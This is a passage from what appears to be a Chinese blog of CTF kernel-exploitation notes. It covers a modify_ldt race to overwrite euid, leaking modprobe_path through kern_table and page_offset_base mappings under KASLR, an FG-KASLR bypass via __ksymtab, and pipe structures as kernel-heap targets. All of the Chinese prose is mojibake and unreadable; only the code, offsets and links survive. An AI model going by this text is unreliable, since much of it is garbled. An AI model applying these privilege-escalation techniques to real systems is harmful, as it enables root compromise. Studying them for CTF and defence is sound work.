ldt;\n```\n\nè€Œå¦‚æœè¿™æ—¶æœ‰ä¸ªæ¡ä»¶ç«äº‰ï¼Œåœ¨æ‹·è´è¿‡ç¨‹ä¸­å°†`new_ldt->entries`ç»™åŠ«æŒäº†ï¼Œé‚£ä¹ˆå°±å¯ä»¥å€ŸåŠ©æ‹·è´ä¹‹åçš„è¯­å¥`new_ldt->entries[ldt_info.entry_number] = ldt;`æ¥ä¾æ®`ldt`ä¿®æ”¹åŠ«æŒä¹‹åçš„`new_ldt->entries`å¯¹åº”å†…å­˜ã€‚\n\nä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶å¯ä»¥ä¿®æ”¹ï¼Œä½†æ˜¯å…¶å®`ldt`ç”±äºä¹‹å‰æåˆ°çš„è®¾ç½®åŸå› ï¼Œå…¶æ•°æ®ä¼šæœ‰æ‰€æ”¹å˜ï¼Œä¸å¤ªèƒ½éšæ„å¯æ§ï¼Œä½†æ˜¯å¦‚æœå¯ä»¥è®¾ç½®4ä¸ªå­—èŠ‚çš„0æ•°æ®ï¼Œé‚£å°±å¯ä»¥è®¾ç½®å½“å‰è¿›ç¨‹çš„euidäº†ï¼Œè¿™æ ·ä¹Ÿèƒ½ææƒï¼Œä½†æ˜¯è¿˜æ²¡æ¥è§¦åˆ°æ€ä¹ˆé€šè¿‡euidè®¾ç½®æ¥ææƒã€‚\n\nä½†æ˜¯`arttnba3`å¸ˆå‚…å†™çš„ç”¨æ¥ä¿®æ”¹euidä¹‹åè°ƒç”¨`seteuid`çš„æ–¹æ³•å¥½ä½¿ï¼Œä¸å¤ªæ¸…æ¥šä¸ºä»€ä¹ˆï¼Œè¿™ä¸ªæ–¹æ³•éœ€è¦çš„æ•°æ®ä¸ç”¨å¤ªä¸¥è‹›å—?ä¸å¤ªæ¸…æ¥šå“ã€‚\n\n[ã€CTF.0x05ã€‘TCTF2021-FINAL ä¸¤é“ kernel pwn é¢˜è§£ - arttnba3's blog](https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/)\n\n```c\ndesc.base_addr = 0;\ndesc.entry_number = 2;\ndesc.limit = 0;\ndesc.seg_32bit = 0;\ndesc.contents = 0 ;\ndesc.limit_in_pages = 0;\ndesc.lm = 0;\ndesc.read_exec_only = 0;\ndesc.seg_not_present = 0;\ndesc.useable = 0;\nsleep(3);\nsyscall(SYS_modify_ldt, 1, &desc, sizeof(desc));\n```\n\n\n\n## 5.kern_tableæ•°ç»„\n\n### å‰ç½®çŸ¥è¯†\n\nè¿™ä¸ªä¸èƒ½å«ç»“æ„ä½“å§ï¼Œä¸è¿‡è¿™ä¸ªå¯ä»¥åˆ©ç”¨\n\n```c\n//v5.17  /kernel/sysctl.c\nstatic struct ctl_table kern_table[] = {\n    //......\n    #ifdef CONFIG_MODULES\n    {\n        .procname\t= \"modprobe\",\n        .data\t\t= &modprobe_path,\n        .maxlen\t\t= KMOD_PATH_LEN,\n        .mode\t\t= 0644,\n        .proc_handler\t= proc_dostring,\n    },\n    {\n        .procname\t= \"modules_disabled\",\n        .data\t\t= &modules_disabled,\n        .maxlen\t\t= sizeof(int),\n        .mode\t\t= 0644,\n        /* only handle a transition from default \"0\" to \"1\" */\n        .proc_handler\t= proc_dointvec_minmax,\n        .extra1\t\t= SYSCTL_ONE,\n        .extra2\t\t= SYSCTL_ONE,\n    },\n    #endif\n    //......\n}\n```\n\nå…¶ä¸­åŒ…å«å¾ˆå¤š`/proc/sys/kernel/`ä¸‹çš„æ–‡ä»¶å¥æŸ„ï¼Œè¿™äº›æ˜¯åœ¨linuxå†…æ ¸å¯åŠ¨æ—¶å°±è¿›è¡Œæ˜ å°„çš„ï¼Œå’Œæ–‡ä»¶ç›¸å…³ä¸€ä¸€å¯¹åº”ï¼Œå¦‚æœæˆ‘ä»¬èƒ½ä¿®æ”¹è¿™äº›å¥æŸ„ï¼Œæ¯”å¦‚å°†`data`æŒ‡é’ˆä¿®æ”¹åˆ°ä»»æ„ä½ç½®ï¼Œå½“æˆ‘ä»¬æ‰“å¼€`/proc/sys/kernel/`ä¸‹å¯¹åº”çš„æ–‡ä»¶æ—¶ï¼Œå°±èƒ½ä¾æ®`data`æŒ‡é’ˆï¼Œè¯»å–åˆ°è¯¥æŒ‡é’ˆå¯¹åº”çš„æ•°æ®ã€‚\n\nè€Œæˆ‘ä»¬ä¸»è¦å°±æ˜¯åˆ©ç”¨å…¶ä¸­çš„`CONFIG_MODULES`å®šä¹‰ä¸‹çš„`modprobe`ï¼Œä¹Ÿå°±æ˜¯ä»¥å‰ææƒç»å¸¸ç”¨åˆ°çš„`modprobe_path`ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œ`modeprobe`è¿™ä¸ªæ–‡ä»¶æ˜ å°„å¥æŸ„å…¶ä¸­ä¿å­˜ç€`modprobe_path`è¿™ä¸ªå…¨å±€å˜é‡\n\n![image-20220328141017757](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281410940.png)\n\nå†…å­˜åˆ†å¸ƒå¦‚ä¸‹\n\n![image-20220328141220790](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281412927.png)\n\n### å®ç°ä»»æ„è¯»å–\n\n#### å†…å­˜æ˜ å°„\n\né™¤äº†ä¸Šè¿°çš„å¯åŠ¨å†…æ ¸æ—¶å‘ç”Ÿæ˜ å°„å¤–ï¼Œå½“æˆ‘ä»¬è¿è¡Œç¨‹åºæ—¶ï¼Œä¹Ÿä¼šåœ¨å†…æ ¸çš„çº¿æ€§åˆ†é…åŒº`page_offset_base`å³`0xffff888000000000`å‘ç”Ÿæ˜ å°„ï¼Œæ¯”å¦‚å¦‚ä¸‹çš„v5.6ç‰ˆæœ¬ä¸‹çš„å†…æ ¸ï¼Œæ²¡å¼€å¯KASLRçš„æƒ…å†µä¸‹æ˜ å°„åç§»ä¸º`0x2444100`å¦‚ä¸‹æ‰€ç¤º\n\n![image-20220328170627765](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281706047.png)\n\nå¯ä»¥çœ‹åˆ°æ•°æ®å®Œå…¨ä¸€è‡´ï¼Œè€Œç”±äºæ˜¯æ˜ å°„å…³ç³»ï¼Œå½“æˆ‘ä»¬ä¿®æ”¹å…¶ä¸­ä¸€éƒ¨åˆ†çš„æ•°æ®æ—¶ï¼Œå¦ä¸€éƒ¨åˆ†æ•°æ®ä¹Ÿä¼šå‘ç”Ÿå˜åŒ–ï¼Œå°è¯•ä¿®æ”¹`data`æŒ‡é’ˆä¸º`0xffffffff82446ab0`ï¼Œä¸¤è¾¹éƒ½å‘ç”Ÿäº†å˜åŒ–ã€‚\n\n![image-20220328171003365](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281710474.png)\n\n#### å†…å­˜å¤åˆ¶\n\né™¤äº†å†…å­˜æ˜ å°„åŒºåŸŸä¹‹å¤–ï¼Œè¿˜æœ‰ä¸€ä¸ªå†…å­˜å¤åˆ¶åŒºåŸŸï¼Œä¹Ÿæ˜¯åœ¨`page_offset_base`ä¸Šï¼Œæ¯”å¦‚è¿™é‡Œçš„åç§»ä¸º`0xec8a440`\n\n![image-20220328172112145](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281721303.png)\n\nå¯ä»¥çœ‹åˆ°å®Œå…¨ä¸€æ ·çš„ï¼Œä½†æ˜¯ç”±äºæ˜¯å¤åˆ¶çš„å…³ç³»ï¼Œæ‰€ä»¥ä¸å­˜åœ¨æ˜ å°„å…³ç³»ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å°†å†…å­˜æ˜ å°„çš„`modprobe`çš„`data`æŒ‡é’ˆæŒ‡å‘å†…å­˜å¤åˆ¶çš„`modprobe`çš„`data`æŒ‡é’ˆï¼Œæ‰“å¼€`/proc/sys/kernel/modprobe`æ–‡ä»¶å³å¯è·å–åˆ°å†…å­˜å¤åˆ¶åŒºåŸŸçš„`modprobe`çš„`data`æŒ‡é’ˆæ•°æ®ï¼Œå³`modprobe_path`çš„åœ°å€ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åœ¨åªæœ‰å †åœ°å€å’Œä»»æ„å†™çš„æ—¶å€™ï¼Œä¸æ³„éœ²å†…æ ¸åŸºåœ°å€çš„æƒ…å†µä¸‹ï¼Œå®Œæˆ`modprobe_path`çš„åœ°å€æ³„éœ²ã€‚\n\n#### KASLR\n\nå¦‚æœå¼€å¯äº†`KASLR`çš„è¯ï¼Œå°±æœ‰ç‚¹ä¸åŒäº†ï¼Œç”±äºæ˜¯æ–‡ä»¶å†…å­˜æ˜ å°„å’Œå¤åˆ¶çš„å…³ç³»ï¼Œæ‰€ä»¥è¿™ä¸ªæ˜ å°„å’Œå¤åˆ¶çš„åç§»é‡å…¶å®æ¯”è¾ƒå–å†³äºæ–‡ä»¶ç³»ç»Ÿå’Œå†…æ ¸ç‰ˆæœ¬ï¼Œå†…æ ¸çš„æ–‡ä»¶ç³»ç»Ÿæ¯”è¾ƒå¤æ‚ï¼ŒVFSæ¥å£ä¸‹å¯è¿æ¥ä¸€å †çš„æ–‡ä»¶ç³»ç»Ÿï¼Œæ¯ä¸ªæ–‡ä»¶ç³»ç»Ÿåˆéƒ½æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½éœ€è¦å®é™…åˆ†æï¼Œä»¥ä¸‹æ˜¯æˆ‘çš„æµ‹è¯•ç»“æœ\n\n##### SVR4\n\nè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿä¹Ÿå°±æ˜¯æˆ‘ä»¬kernelé¢˜ä¸­å¸¸è§çš„cpioåç¼€ä½¿ç”¨çš„ï¼Œæ²¡æœ‰å¼€å¯KASLRçš„æ—¶å€™ï¼Œæ˜ å°„å’Œå¤åˆ¶çš„åç§»éƒ½æ˜¯ç¡®å®šçš„ï¼Œå®é™…è°ƒä¸€ä¸‹ï¼Œå€Ÿç”¨pedaæ’ä»¶çš„findåŠŸèƒ½å¯ä»¥å®¹æ˜“æœç´¢åˆ°ã€‚ä½†æ˜¯å¼€å¯ä¹‹åï¼Œå¤åˆ¶çš„åç§»åŸºæœ¬ä¸ä¼šå˜åŒ–ï¼Œä½†æ˜¯æ˜ å°„çš„åç§»ä¼šå‘ç”Ÿå˜åŒ–ï¼Œæµ‹è¯•å¤šæ¬¡å¦‚ä¸‹\n\n```\nv5.6\n#modprobe_map 0x2444100\n#modprobe_map 0x6844100\n#modprobe_map 0x6c44100\n#modprobe_map 0xd244100\n#modprobe_map 0x5844100\n\n#modprobe_copy 0xec8a440\n```\n\nä½†æ˜¯è§‚å¯Ÿä¹Ÿå¯ä»¥çœ‹åˆ°ï¼Œå…¶å®åç§»å‘ç”Ÿçš„è¯ï¼Œç›¸å¯¹äºæ˜ å°„åŒºåŸŸï¼Œåªæœ‰ä¸€ä¸ªå­—èŠ‚å‘ç”Ÿæ”¹å˜ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥å°è¯•çˆ†ç ´è¿™ä¸€ä¸ªå­—èŠ‚æ¥è·å–ã€‚\n\n##### ext4\n\nè¿™ä¸ªæ–‡ä»¶ç³»ç»Ÿçš„ä¹Ÿæ¯”è¾ƒå¸¸è§ï¼Œä¸è¿‡æ¯”è¾ƒå¥½çš„ä¸€ç‚¹å°±æ˜¯ï¼Œå®é™…æµ‹è¯•ç»“æœå‘ç°æ˜ å°„å’Œå¤åˆ¶çš„åç§»åœ¨å¼€å¯KASLRä¹‹åéƒ½ä¸ä¼šå‘ç”Ÿæ”¹å˜ï¼Œæ‰€ä»¥æµ‹å‡ºæ¥å°±å¯ä»¥ç›´æ¥ä½¿ç”¨äº†ã€‚\n\n```\nv5.15.26\n#modprobe_map 0x3502530\n#modprobe_copy 0x264e608\n```\n\nè¿™ä¸ªä¸»è¦æ˜¯æœ€è¿‘çš„LINECTFä¸Šçš„encryptè¿™ä¸ªå†…æ ¸é¢˜äº‹åçœ‹WPå‡ºæ¥çš„ï¼Œå¿˜è®°å“ªä½å¸ˆå‚…äº†ã€‚\n\n### å…¶ä»–çŒœæƒ³\n\nä¹‹å‰çš„`kern_table`çš„ç»“æ„å¯ä»¥çœ‹åˆ°ï¼Œæ¯ä¸ªæ–‡ä»¶éƒ½æœ‰`.mode`å±æ€§ï¼Œè¿™ä¸ªå±æ€§å…¶å®å°±æ˜¯è¯¥æ–‡ä»¶çš„æƒé™å±æ€§ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬è¾“å…¥`ls -al file`å‡ºæ¥çš„ç›¸å…³æƒé™\n\n![image-20220329193540405](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220329193540405.png)\n\næˆ‘ä»¬ä¹Ÿå¯ä»¥å¯¹å…¶è¿›è¡Œæ“æ§ã€‚\n\n#### æƒé™æ›´æ”¹\n\nçŒœæƒ³ä¸€ä¸‹å¦‚æœæ›´æ”¹è¯¥æ–‡ä»¶ï¼Œä½¿å…¶å†…å®¹å˜ä¸ºä¸€ä¸ªå¯æ‰§è¡Œçš„elfæ–‡ä»¶ï¼ŒåŠŸèƒ½ä¸º`cat /flag`ï¼Œç„¶åæ›´æ”¹å…¶æƒé™ï¼Œèµ‹äºˆsuidçš„æƒé™ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼Œå°±å¯ä»¥ä»¥rootæƒé™æ¥`cat flag`ã€‚å½¢å¼å¦‚ä¸‹\n\n![image-20220329205636964](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220329205636964.png)\n\n\n\n#### å­˜åœ¨é—®é¢˜\n\nä½†æ˜¯è¿™é‡Œæœ‰ç‚¹é—®é¢˜ï¼Œæˆ‘å®é™…æ“ä½œçš„æ—¶å€™ï¼Œæƒé™å€’æ˜¯å¾ˆå®¹æ˜“æ›´æ”¹ï¼Œä½†æ˜¯å†…å®¹ä¸èƒ½å†™å…¥`\\x00`å’Œ`\\n`ï¼Œå°±å¾ˆä¸å¥½åˆ¶ä½œä¸€ä¸ªå¯æ‰§è¡Œçš„ELFæ–‡ä»¶ï¼Œä¸çŸ¥é“æœ‰æ²¡æœ‰ä»€ä¹ˆå…¶ä»–åŠæ³•ç»•è¿‡ã€‚\n\nå¯å‚è€ƒï¼š[æ‰“é€ å²ä¸Šæœ€å°å¯æ‰§è¡ŒELFæ–‡ä»¶(45å­—èŠ‚) - C è¯­è¨€ç¼–ç¨‹é€è§† (gitbook.io)](https://tinylab-1.gitbook.io/cbook/02-chapter8)\n\næ­¤å¤–ä¹‹å‰Pç¥çš„æ–‡ç« ä¹Ÿæåˆ°ï¼Œå¦‚æœåªæ˜¯suidçš„æƒé™çš„è¯ï¼Œç”¨shellè„šæœ¬æ˜¯ä¸è¡Œçš„ï¼Œæ‰€ä»¥è¿™æ–¹é¢ä¹Ÿä¸å¤ªèƒ½å¤Ÿæå®šã€‚\n\n[è°ˆä¸€è°ˆLinuxä¸suidææƒ | ç¦»åˆ«æ­Œ (leavesongs.com)](https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html)\n\nè‡³ä»Šè¿˜æ˜¯ä¸çŸ¥é“æœ‰æ²¡æœ‰ä»€ä¹ˆå…¶ä»–çš„æ–¹æ³•æ¥ç»•è¿‡ã€‚\n\n## 6.__ksymtabæ•°ç»„\n\n### å‰ç½®çŸ¥è¯†\n\né€šå¸¸ç”¨åœ¨å¼€å¯`FG-KASLR`çš„æƒ…å†µï¼Œè¯¥ä¿æŠ¤éœ€è¦ç¼–è¯‘æ—¶å¼€å¯\n\n```\nCONFIG_FG_KASLR=y\nCONFIG_MODULE_FG_KASLR=y #æ¨¡å—éšæœºåŒ–\n```\n\né€šè¿‡`nofgkaslr`æ¥å…³é—­\n\nä¸è¿‡æˆ‘åœ¨ç¼–è¯‘è®¾ç½®`.config`çš„æ—¶å€™ï¼Œæ²¡æœ‰æ‰¾åˆ°è¿™äº›é€‰é¡¹ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆã€‚\n\nå‚è€ƒï¼š\n\n[FGKASLR - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/#__ksymtab)\n\n[Kernel_pwn FG_KASLR in ROP | An9Ela (zhangyidong.top)](https://zhangyidong.top/2021/02/10/kernel_pwn(fg_kaslr)/)\n\nä¸»è¦åœ¨äº\n\n- å†…æ ¸ç¬¦å·è¡¨`__ksymtab `\n- `.data`\n\n- `swapgs_restore_regs_and_return_to_usermode`\n- `modprobe_path`\n- å­˜åœ¨äº`.text_base`åˆ°`__x86_retpoline_r15`çš„å‡½æ•°æ²¡æœ‰å—åˆ°å½±å“ã€‚æ˜¾ç„¶`commit_creds`å’Œ`prepare_kernel_cred()`æ²¡æœ‰åŒ…å«åœ¨å†…ï¼Œä½†æ˜¯å¯ä»¥åœ¨é‡Œé¢å¯»æ‰¾ä¸€äº›gadget\n\nä»¥ä¸Šå‡ä¸ä¼šå‘ç”Ÿ`FG-KASLR`çš„éšæœºåŒ–\n\né‚£ä¹ˆè¿™é‡Œå°±æ˜¯ä¸»è¦å…³æ³¨äº`__ksymtab`æ•°ç»„ï¼Œå­˜åœ¨äºè¯¥æ•°ç»„ä¸­çš„æ¯ä¸€ä¸ªå‡½æ•°å—éƒ½æœ‰å¦‚ä¸‹ç»“æ„\n\n```c\n//v5.17 /include/linux/export.h\nstruct kernel_symbol {\n\tint value_offset;\n\tint name_offset;\n\tint namespace_offset;\n};\n```\n\næ³¨æ„æ˜¯åœ¨v5.17ä¸‹ï¼Œåœ¨ä½ç‰ˆæœ¬ä¸‹å¥½åƒåå­—æœ‰ç‚¹ä¸åŒï¼Œä¸è¿‡ä¹Ÿå¤§åŒå°å¼‚\n\n### ç»•è¿‡FG-KASLR\n\nå› ä¸º`__ksymtab`æ˜¯ä¸ä¼šè¢«è¯¥æœºåˆ¶å½±å“çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬è‚¯å®šå¯ä»¥åœ¨æ²¡æœ‰å¼€å¯KASLRçš„æ—¶å€™é€šè¿‡`kallsym`æ¥è·å–åˆ°è¯¥åœ°å€ï¼Œæ¥ç€å°±å¯ä»¥æ‰¾åˆ°å¯¹åº”å‡½æ•°çš„`kernel_symbol`ç»“æ„ä½“åç§»ï¼Œå¦‚ä¸‹æ‰€ç¤º\n\n![image-20220330113641265](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330113641265.png)\n\næ‰€ä»¥å°±å¯ä»¥è¿™æ ·æ¥å¾—åˆ°å¯¹åº”çš„ä»»æ„åœ°å€ï¼Œè®¡ç®—çš„æ—¶å€™å¯ä»¥è¿™æ ·è®¡ç®—ï¼Œé€šè¿‡è¡¥ç æ¥è¿›è¡Œè®¡ç®—æ›´å¿«ä¸€ç‚¹ã€‚\n\n![image-20220330113813160](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330113813160.png)\n\n\n\n## 7.pipeç®¡é“---kmalloc-1024/kmalloc-192\n\nå‚ç…§ï¼š[(31æ¡æ¶ˆæ¯) Linuxç³»ç»Ÿè°ƒç”¨ï¼špipe()ç³»ç»Ÿè°ƒç”¨æºç åˆ†æ_rtoaxçš„åšå®¢-CSDNåšå®¢_linux pipe æºç ](https://blog.csdn.net/Rong_Toa/article/details/116270704)****\n\né€šå¸¸æ¥è®²ï¼Œç®¡é“ç”¨æ¥åœ¨çˆ¶è¿›ç¨‹å’Œå­è¿›ç¨‹ä¹‹é—´é€šä¿¡ï¼Œå› ä¸º`fork`å‡ºæ¥çš„å­è¿›ç¨‹ä¼šç»§æ‰¿çˆ¶è¿›ç¨‹çš„æ–‡ä»¶æè¿°ç¬¦å‰¯æœ¬ã€‚è¿™é‡Œå°±ä½¿ç”¨å½“å‰è¿›ç¨‹æ¥åˆ›å»ºç®¡é“ç¬¦ï¼Œä»ç®¡é“çš„è¯»å–ç«¯(`pipe_fd[0]`)å’Œå†™å…¥ç«¯(`pipe_fd[1]`)æ¥è¿›è¡Œåˆ©ç”¨ã€‚\n\n### (1)ä½¿ç”¨æ–¹æ³•\n\n#### â‘ åˆ›å»º\n\n```c\n#include <unistd.h>\n\n//ä½¿ç”¨pipeæˆ–è€…pipe2\nint pipe_fd[2];\n\npipe(pipe_fd);//é»˜è®¤é˜»å¡çŠ¶æ€\n//pipe2(pipe_fd,flag);\n```\n\nå…¶ä¸­`pipe2`å‡½æ•°æˆ–è€…ç³»ç»Ÿè°ƒç”¨`__NR_pipe2`çš„`flag`æ”¯æŒé™¤0ä¹‹å¤–çš„ä¸‰ç§æ¨¡å¼ï¼Œå¯ç”¨åœ¨`man`æ‰‹å†Œä¸­æŸ¥çœ‹ã€‚\n\nå¦‚æœä¼ å…¥çš„`flag`ä¸º0ï¼Œåˆ™å’Œ`pipe`å‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œæ˜¯é˜»å¡çš„ã€‚\n\né˜»å¡çŠ¶æ€ï¼šå³å½“æ²¡æœ‰æ•°æ®åœ¨ç®¡é“ä¸­æ—¶ï¼Œå¦‚æœè¿˜è°ƒç”¨`read`ä»ç®¡é“è¯»å–æ•°æ®ï¼Œé‚£ä¹ˆå°±ä¼šä½¿å¾—ç¨‹åºå¤„äºé˜»å¡çŠ¶æ€ï¼Œå…¶ä»–çš„ä¹Ÿæ˜¯ç±»ä¼¼çš„æƒ…å†µã€‚\n\nä¼šé»˜è®¤åˆ›å»ºä¸¤ä¸ªfdæ–‡ä»¶æè¿°ç¬¦çš„ï¼Œè¯¥fdæ–‡ä»¶æè¿°ç¬¦æ•ˆæœçš„ç›¸å…³ç»“æ„å¦‚ä¸‹\n\n```c\n//v5.9  /fs/pipe.c\nconst struct file_operations pipefifo_fops = {\n\t.open\t\t= fifo_open,\n\t.llseek\t\t= no_llseek,\n\t.read_iter\t= pipe_read,\n\t.write_iter\t= pipe_write,\n\t.poll\t\t= pipe_poll,\n\t.unlocked_ioctl\t= pipe_ioctl,\n\t.release\t= pipe_release,\n\t.fasync\t\t= pipe_fasync,\n};\n```\n\næ”¾å…¥åˆ°`pipe_fd`ä¸­ï¼Œå¦‚ä¸‹\n\n```c\nint pipe_fd[2];\npipe(pipe_fd);\n\nprintf(\"pipe_fd[0]:%d\\n\",pipe_fd[0]);\nprintf(\"pipe_fd[1]:%d\\n\",pipe_fd[1]);\n```\n\næ•ˆæœå¦‚ä¸‹ï¼š\n\n![image-20220509161948796](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png)\n\nä¹‹åä½¿ç”¨`write/read`æ¥å†™å…¥è¯»å–å³å¯ï¼Œæ³¨æ„å†™å…¥ç«¯ä¸º`fd[1]`ï¼Œè¯»å–ç«¯ä¸º`fd[0]`\n\n```c\nchar buf[0x8] = {0};\nchar* msg = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";\nwrite(pipe_fd[1],msg,0x8);\nread(pipe_fd[0],buf,0x8);\n```\n\n\n\n#### â‘¡é‡Šæ”¾\n\nç”±äº`pipe`ç®¡é“åˆ›å»ºåä¼šå¯¹åº”åˆ›å»ºæ–‡ä»¶æè¿°ç¬¦ï¼Œæ‰€ä»¥é‡Šæ”¾ä¸¤ç«¯å¯¹åº”çš„æ–‡ä»¶æè¿°ç¬¦å³å¯é‡Šæ”¾ç®¡é“`pipe`ç®¡é“\n\n```c\nclose(pipe_fd[0]);\nclose(pipe_fd[1]);\n```\n\néœ€è¦å°†ä¸¤ä¸ªæ–‡ä»¶æè¿°ç¬¦fdéƒ½ç»™é‡Šæ”¾æ‰æˆ–è€…ä½¿ç”¨`read`å°†ç®¡é“ä¸­æ‰€æœ‰æ•°æ®éƒ½è¯»å–å‡ºæ¥ï¼Œæ‰ä¼šè¿›å…¥`free_pipe_info`å‡½æ•°æ¥é‡Šæ”¾åœ¨çº¿æ€§æ˜ å°„åŒºåŸŸç”³è¯·çš„ç›¸å…³å†…å­˜èµ„æºï¼Œå¦åˆ™è¿˜æ˜¯ä¸ä¼šè¿›å…¥çš„ã€‚\n\n\n\n### (2)å†…å­˜åˆ†é…ä¸é‡Šæ”¾\n\n#### â‘ åˆ†é…\n\nå‘ç”Ÿåœ¨è°ƒç”¨`pipe`/`pipe2`å‡½æ•°ï¼Œæˆ–è€…ç³»ç»Ÿè°ƒç”¨`__NR_pipe`/`__NR_pipe2`æ—¶ï¼Œå†…æ ¸å…¥å£ä¸º\n\n```c\nSYSCALL_DEFINE2(pipe2, int __user *, fildes, int, flags)\n{\n\treturn do_pipe2(fildes, flags);\n}\n\nSYSCALL_DEFINE1(pipe, int __user *, fildes) /* pipe() ç³»ç»Ÿè°ƒç”¨ */\n{\n\treturn do_pipe2(fildes, 0);\n}\n```\n\nå‡½æ•°è°ƒç”¨é“¾ï¼š\n\n```\ndo_pipe2()->__do_pipe_flags()->create_pipe_files()->get_pipe_inode()->alloc_pipe_info()\n```\n\nè°ƒç”¨ä¹‹åä¼šåœ¨å†…æ ¸çš„çº¿æ€§æ˜ å°„åŒºåŸŸè¿›è¡Œå†…å­˜åˆ†é…ï¼Œä¹Ÿå°±æ˜¯å¸¸è§çš„å†…æ ¸å †ç®¡ç†çš„åŒºåŸŸã€‚åˆ†é…ç‚¹åœ¨å¦‚ä¸‹å‡½æ•°ä¸­ï¼š\n\n```c\n//v5.9 /fs/pipe.c\nstruct pipe_inode_info *alloc_pipe_info(void)\n{\n\tstruct pipe_inode_info *pipe;\n\tunsigned long pipe_bufs = PIPE_DEF_BUFFERS;\n\n    //#define PIPE_DEF_BUFFERS\t16\n    //.....\n    //pipe_inode_infoç®¡ç†ç»“æ„ï¼Œå¤§å°ä¸º0xa0ï¼Œå±äºkmalloc-192\n\tpipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);\n\tif (pipe == NULL)\n\t\tgoto out_free_uid;\n\n    //.....\n    //ç›¸å…³çš„æ¶ˆæ¯ç»“æ„ä¸ºpipe_bufferæ•°ç»„,æ€»å…±16*0x28=0x280,ç›´æ¥ä»kmalloc-1024ä¸­æ‹¿å–å †å—\n\tpipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),\n\t\t\t     GFP_KERNEL_ACCOUNT);\n    \n    //.....\n\t//å¯¹ç”³è¯·çš„pipeç®¡é“è¿›è¡Œä¸€äº›åˆå§‹åŒ–\n\tif (pipe->bufs) {\n\t\tinit_waitqueue_head(&pipe->rd_wait);\n\t\tinit_waitqueue_head(&pipe->wr_wait);\n\t\tpipe->r_counter = pipe->w_counter = 1;\n\t\tpipe->max_usage = pipe_bufs;\n\t\tpipe->ring_size = pipe_bufs;\n\t\tpipe->nr_accounted = pipe_bufs;\n\t\tpipe->user = user;\n\t\tmutex_init(&pipe->mutex);\n\t\treturn pipe;\n\t}\n\n    //.....\n    //å‡ºé”™çš„è¯åˆ™ä¼šé‡Šæ”¾æ‰ï¼Œå…·ä½“å¹²å•¥çš„ä¸å¤ªæ¸…æ¥š\nout_free_uid:\n\tfree_uid(user);\n\treturn NULL;\n}\n```\n\nç›¸å…³çš„`pipe_inode_info`ç»“æ„å¦‚ä¸‹\n\n```c\n//v5.9 /include/linux/pipe_fs_i.h\nstruct pipe_inode_info {\n\tstruct mutex mutex;\n\twait_queue_head_t rd_wait, wr_wait;\n\tunsigned int head;\n\tunsigned int tail;\n\tunsigned int max_usage;\n\tunsigned int ring_size;\n#ifdef CONFIG_WATCH_QUEUE\n\tbool note_loss;\n#endif\n\tunsigned int nr_accounted;\n\tunsigned int readers;\n\tunsigned int writers;\n\tunsigned int files;//æ–‡ä»¶æè¿°ç¬¦è®¡æ•°ï¼Œéƒ½ä¸º0æ—¶æ‰ä¼šé‡Šæ”¾ç®¡é“\n\tunsigned int r_counter;\n\tunsigned int w_counter;\n\tstruct page *tmp_page;\n\tstruct fasync_struct *fasync_readers;\n\tstruct fasync_struct *fasync_writers;\n    //pipe_bufferæ•°ç»„,16ä¸ª,æ¯ä¸ªå¤§å°ä¸º0xa0,é€šå¸¸æˆ‘ä»¬ä»è¿™ä¸Šé¢æ³„éœ²åœ°å€æˆ–è€…åŠ«æŒç¨‹åºæµ\n\tstruct pipe_buffer *bufs;\n\tstruct user_struct *user;\n#ifdef CONFIG_WATCH_QUEUE\n\tstruct watch_queue *watch_queue;\n#endif\n};\n```\n\n\n\n#### â‘¡é‡Šæ”¾\n\nç›´æ¥ä½¿ç”¨`close`å‡½æ•°é‡Šæ”¾ç®¡é“ç›¸å…³çš„æ–‡ä»¶æè¿°ç¬¦fdä¸¤ç«¯ã€‚\n\nå‡½æ•°é“¾è°ƒç”¨é“¾ï¼š\n\n```\npipe_release()->put_pipe_info()->free_pipe_info()\n```\n\néœ€è¦æ³¨æ„çš„æ—¶ï¼Œåœ¨`put_pipe_info`å‡½æ•°ä¸­\n\n```c\n//v5.9 /fs/pipe.c\nstatic void put_pipe_info(struct inode *inode, struct pipe_inode_info *pipe)\n{\n\tint kill = 0;\n\n\tspin_lock(&inode->i_lock);\n\tif (!--pipe->files) {\n\t\tinode->i_pipe = NULL;\n\t\tkill = 1;\n\t}\n\tspin_unlock(&inode->i_lock);\n\n    //å½“filesä¸º0æ‰ä¼šè¿›å…¥è¯¥å‡½æ•°\n\tif 